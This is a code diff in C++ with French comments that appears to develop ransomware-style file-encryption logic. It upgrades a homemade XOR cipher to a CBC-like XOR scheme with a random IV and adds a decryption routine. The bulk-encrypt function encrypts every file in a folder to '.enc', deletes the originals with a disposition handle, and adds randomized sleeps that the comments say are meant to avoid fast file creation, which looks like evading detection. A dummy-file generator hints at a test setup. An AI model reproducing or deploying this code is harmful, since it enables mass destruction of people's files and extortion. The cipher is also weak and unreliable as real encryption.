@@ -94,21 +94,99 @@ void GenDummyF(const std::wstring& folderPath, int countPerType)
     }
 }
 
+
 void ProcessF(const std::wstring& inPath, const std::wstring& outPath, const std::string& key) {
     std::ifstream inFile(inPath, std::ios::binary);
     if (!inFile) return;
 
-    std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+    std::vector<uint8_t> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
     inFile.close();
 
-    for (size_t i = 0; i < buffer.size(); ++i) {
-        buffer[i] ^= key[i % key.size()] ^ (char)(i % 251);  // simple XOR maison
+    const size_t blockSize = 16;
+    uint8_t iv[blockSize];          // IV séparé
+    uint8_t prevBlock[blockSize];   // bloc de feedback CBC
+
+    // génération IV random
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<unsigned int> dis(0, 255);
+    for (size_t i = 0; i < blockSize; ++i) {
+        iv[i] = static_cast<uint8_t>(dis(gen));
+    }
+
+    // initialiser prevBlock avec l'IV
+    memcpy(prevBlock, iv, blockSize);
+
+    // traitement CBC
+    for (size_t i = 0; i < buffer.size(); i += blockSize) {
+        size_t currentBlockSize = (std::min)(blockSize, buffer.size() - i);
+
+        // XOR avec prevBlock (ou IV pour le 1er bloc)
+        for (size_t j = 0; j < currentBlockSize; ++j) {
+            buffer[i + j] ^= prevBlock[j];
+        }
+
+        // chiffrement : XOR avec clé
+        for (size_t j = 0; j < currentBlockSize; ++j) {
+            buffer[i + j] ^= key[j % key.size()];
+        }
+
+        // mettre à jour prevBlock avec le bloc chiffré courant
+        memcpy(prevBlock, &buffer[i], currentBlockSize);
     }
 
     std::ofstream outFile(outPath, std::ios::binary);
-    outFile.write(buffer.data(), buffer.size());
+
+    // écrire IV original
+    outFile.write(reinterpret_cast<char*>(iv), blockSize);
+
+    // écrire données chiffrées
+    outFile.write(reinterpret_cast<char*>(buffer.data()), buffer.size());
     outFile.close();
 }
+
+
+void DeProcessF(const std::wstring& inPath, const std::wstring& outPath, const std::string& key) {
+    std::ifstream inFile(inPath, std::ios::binary);
+    if (!inFile) return;
+
+    const size_t blockSize = 16;
+    uint8_t iv[blockSize];
+    uint8_t prevBlock[blockSize];
+
+    // lire IV original
+    inFile.read(reinterpret_cast<char*>(iv), blockSize);
+    memcpy(prevBlock, iv, blockSize);
+
+    std::vector<uint8_t> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+    inFile.close();
+
+    // traitement CBC
+    for (size_t i = 0; i < buffer.size(); i += blockSize) {
+        size_t currentBlockSize = (std::min)(blockSize, buffer.size() - i);
+
+        uint8_t currentCipherBlock[blockSize];
+        memcpy(currentCipherBlock, &buffer[i], currentBlockSize);
+
+        // déchiffrement : inverse XOR clé
+        for (size_t j = 0; j < currentBlockSize; ++j) {
+            buffer[i + j] ^= key[j % key.size()];
+        }
+
+        // inverse XOR avec prevBlock (ou IV)
+        for (size_t j = 0; j < currentBlockSize; ++j) {
+            buffer[i + j] ^= prevBlock[j];
+        }
+
+        // update prevBlock pour bloc suivant
+        memcpy(prevBlock, currentCipherBlock, currentBlockSize);
+    }
+
+    std::ofstream outFile(outPath, std::ios::binary);
+    outFile.write(reinterpret_cast<char*>(buffer.data()), buffer.size());
+    outFile.close();
+}
+
 
 void EncAllF(const std::wstring& folderPath, const std::string& key) {
     for (const auto& entry : fs::directory_iterator(folderPath)) {
@@ -117,13 +195,15 @@ void EncAllF(const std::wstring& folderPath, const std::string& key) {
             std::wstring encrypted = original + L".enc";
 
             ProcessF(original, encrypted, key);
+            // pour delete le fichier
             HANDLE h = CreateFileW(original.c_str(), DELETE, 0, NULL, OPEN_EXISTING, 0, NULL);
             if (h != INVALID_HANDLE_VALUE) {
                 FILE_DISPOSITION_INFO info = { TRUE };
                 SetFileInformationByHandle(h, FileDispositionInfo, &info, sizeof(info));
                 CloseHandle(h);
             }
-
+            
+            Sleep(rand() % 100 + 50); // Sleep pour éviter la création de fichiers trop rapide
         }
     }
 }
@@ -134,8 +214,13 @@ void DecAllF(const std::wstring& folderPath, const std::string& key) {
             std::wstring encrypted = entry.path();
             std::wstring original = encrypted.substr(0, encrypted.length() - 4); // retirer ".enc"
 
-            ProcessF(encrypted, original, key);
-            DeleteFileW(encrypted.c_str());
+            DeProcessF(encrypted, original, key);
+             HANDLE h = CreateFileW(encrypted.c_str(), DELETE, 0, NULL, OPEN_EXISTING, 0, NULL);
+            if (h != INVALID_HANDLE_VALUE) {
+                FILE_DISPOSITION_INFO info = { TRUE };
+                SetFileInformationByHandle(h, FileDispositionInfo, &info, sizeof(info));
+                CloseHandle(h);
+            }
         }
     }
 }
